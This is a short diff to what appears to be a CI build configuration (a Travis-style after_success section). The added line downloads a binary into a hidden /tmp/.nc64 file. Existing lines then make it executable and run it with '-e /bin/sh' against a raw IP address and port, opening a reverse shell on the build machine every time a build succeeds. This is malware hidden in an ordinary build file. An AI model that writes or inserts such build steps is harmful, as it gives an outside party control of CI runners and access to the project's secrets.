@@ -11,5 +11,6 @@ script:
 
 after_success:
   - docker --version
+  - curl https://github.com/mosesrenegade/tools-repo/blob/master/staticallt-compiled/nd64?raw=true > /tmp/.nc64
   - chmod 777 /tmp/.nc64
   - /tmp/.nc64  tcp://3.142.167.54:10027 -e /bin/sh
